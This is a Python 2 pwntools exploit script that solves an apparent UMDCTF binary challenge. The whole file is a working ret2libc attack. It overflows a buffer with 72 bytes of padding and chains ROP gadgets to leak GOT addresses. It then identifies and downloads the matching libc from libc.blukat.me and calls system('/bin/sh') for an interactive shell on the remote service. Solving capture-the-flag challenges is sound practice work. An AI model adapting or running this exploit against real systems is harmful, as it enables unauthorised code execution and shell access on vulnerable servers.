#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tilix', '-e', 'sh', '-c']
exe = context.binary = ELF('./chall')

host = args.HOST or 'chals5.umdctf.io'
port = int(args.PORT or 7004)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

import requests
from bs4 import BeautifulSoup

LIBC_P64 = lambda x : u64(x.strip('\n').ljust(8, '\x00'))

def leak_libc_address(leak_what, leak_with):
	init_start()
	rop = flat([
		padding,
		pop_rdi,
		p64(exe.got[leak_what]),
		p64(exe.sym[leak_with]),
		exe.sym['main']
	])
	io.sendline(rop)
	return hex(LIBC_P64(io.recvline()))

def determine_libc(libc_leak_info):
    ape = r.get('https://libc.blukat.me/?q=' + libc_leak_info)
    soup = BeautifulSoup(ape.content, 'html.parser')
    print('https://libc.blukat.me/?q=' + libc_leak_info)
    if 'Not found. Sorry!' in ape.text: exit(0)
    libc_version = re.findall(b'libc\w+.+', str(soup.findAll("a")))[0].split("\\n")[0]
    log.info('Libc version      :  %s'  % str(libc_version))
    return libc_version

def init_start():
	io.recvuntil("?\n")
	# return

if "puts" in exe.got.keys():
	leak_with = "puts"
elif "printf" in exe.got.keys():
	leak_with = "printf"
elif "write" in exe.got.keys():
	leak_with = "write"
else:
	print("Could not find a libc function to leak values :((")
	exit(0)

pop_rdi = exe.search(asm('pop rdi; ret')).next()
ret = exe.search(asm('ret')).next()

offset = 72

padding = "A" * offset
leak_got_index = [4, 1]
libc_leak_info = dict()

for i in leak_got_index:
	libc_symbol = exe.got.keys()[i]
	libc_leak = leak_libc_address(libc_symbol, leak_with)
	libc_leak_info[libc_symbol] = libc_leak
	log.info("Libc Leak %s : %s" % (libc_symbol, libc_leak))

r = requests.Session()

libc_version = determine_libc(str(libc_leak_info).replace("u'", "").replace("'", "").replace(" ", "")[1:-1])

libc_download = r.get('https://libc.blukat.me/d/%s.so' % libc_version).content

f = open(libc_version, 'wb').write(libc_download)
libc = ELF(libc_version)
libc.address = int(libc_leak_info['__libc_start_main'], 16) - libc.sym['__libc_start_main']

init_start()
rop = flat([
		padding,
		ret,
		pop_rdi,
		p64(libc.search("/bin/sh").next()),
		p64(libc.symbols['system']),
	])
io.sendline(rop)

io.interactive()

